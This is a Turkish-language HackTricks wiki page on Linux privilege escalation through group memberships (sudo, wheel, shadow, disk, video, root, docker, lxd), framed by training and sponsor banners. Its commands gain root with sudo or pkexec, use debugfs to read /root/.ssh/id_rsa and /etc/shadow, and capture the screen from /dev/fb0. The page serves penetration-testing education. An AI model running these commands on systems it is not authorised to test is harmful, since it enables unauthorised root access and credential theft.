{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

# Sudo/Admin Grupları

## **PE - Yöntem 1**

**Bazen**, **varsayılan olarak \(ya da bazı yazılımlar bunu gerektirdiği için\)** **/etc/sudoers** dosyası içinde bu satırlardan bazılarını bulabilirsiniz:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Bu, **sudo veya admin grubuna ait olan herhangi bir kullanıcının sudo olarak her şeyi çalıştırabileceği** anlamına gelir.

Eğer durum böyleyse, **root olmak için sadece şunu çalıştırabilirsiniz**:
```text
sudo su
```
## PE - Yöntem 2

Tüm suid ikili dosyalarını bulun ve **Pkexec** ikili dosyasının olup olmadığını kontrol edin:
```bash
find / -perm -4000 2>/dev/null
```
Eğer pkexec ikili dosyasının SUID ikili dosyası olduğunu ve sudo veya admin grubuna ait olduğunuzu bulursanız, muhtemelen pkexec kullanarak ikili dosyaları sudo olarak çalıştırabilirsiniz. İçeriği kontrol edin:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Orada hangi grupların **pkexec** çalıştırmasına izin verildiğini ve bazı Linux sistemlerinde **varsayılan olarak** **sudo veya admin** gruplarının **görünebileceğini** bulacaksınız.

**root olmak için şunu çalıştırabilirsiniz**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Eğer **pkexec** komutunu çalıştırmaya çalışırsanız ve bu **hata** ile karşılaşırsanız:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**İzinleriniz olmadığı için değil, GUI olmadan bağlı olmadığınız için**. Bu sorun için bir çözüm burada: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2 farklı ssh oturumuna** ihtiyacınız var:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel Grubu

**Bazen**, **varsayılan olarak** **/etc/sudoers** dosyası içinde bu satırı bulabilirsiniz:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Bu, **wheel grubuna ait olan herhangi bir kullanıcının sudo olarak her şeyi çalıştırabileceği** anlamına gelir.

Eğer durum böyleyse, **root olmak için sadece şunu çalıştırabilirsiniz**:
```text
sudo su
```
# Shadow Grubu

**shadow** grubundaki kullanıcılar **/etc/shadow** dosyasını **okuyabilir**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, read the file and try to **crack some hashes**.

# Disk Group

Bu ayrıcalık neredeyse **root erişimi ile eşdeğerdir** çünkü makinenin içindeki tüm verilere erişebilirsiniz.

Dosyalar:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Not edin ki debugfs kullanarak **dosya yazabilirsiniz**. Örneğin, `/tmp/asd1.txt` dosyasını `/tmp/asd2.txt` dosyasına kopyalamak için şunu yapabilirsiniz:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ancak, eğer **root tarafından sahip olunan dosyaları yazmaya** çalışırsanız \(örneğin `/etc/shadow` veya `/etc/passwd`\) "**İzin reddedildi**" hatası alırsınız.

# Video Grubu

`w` komutunu kullanarak **sistemde kimin oturum açtığını** bulabilirsiniz ve aşağıdaki gibi bir çıktı gösterecektir:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**, kullanıcının **yossi'nin makinedeki bir terminale fiziksel olarak giriş yaptığını** gösterir.

**video grubu**, ekran çıktısını görüntüleme erişimine sahiptir. Temelde ekranları gözlemleyebilirsiniz. Bunu yapmak için, ekranın **mevcut görüntüsünü ham veri olarak yakalamanız** ve ekranın kullandığı çözünürlüğü almanız gerekir. Ekran verileri `/dev/fb0`'da kaydedilebilir ve bu ekranın çözünürlüğünü `/sys/class/graphics/fb0/virtual_size`'da bulabilirsiniz.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**Ham görüntüyü** açmak için **GIMP** kullanabilir, **`screen.raw`** dosyasını seçebilir ve dosya türü olarak **Ham görüntü verisi** seçebilirsiniz:

![](../../.gitbook/assets/image%20%28208%29.png)

Sonra Genişlik ve Yükseklik değerlerini ekranda kullanılanlarla değiştirin ve farklı Görüntü Türlerini kontrol edin \(ve ekranı daha iyi göstereni seçin\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Root Grubu

Görünüşe göre varsayılan olarak **root grubunun üyeleri**, bazı **hizmet** yapılandırma dosyalarını veya bazı **kütüphaneler** dosyalarını veya ayrıcalıkları artırmak için kullanılabilecek **diğer ilginç şeyleri** **değiştirme** erişimine sahip olabilir...

**Root üyelerinin hangi dosyaları değiştirebileceğini kontrol edin**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Grubu

Ana makinenin kök dosya sistemini bir örneğin hacmine monte edebilirsiniz, böylece örnek başladığında hemen o hacme `chroot` yükler. Bu, makinede size kök erişimi sağlar.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Grubu

[lxc - Yetki Yükseltme](lxd-privilege-escalation.md)

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturmak ve **otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** bizi **takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
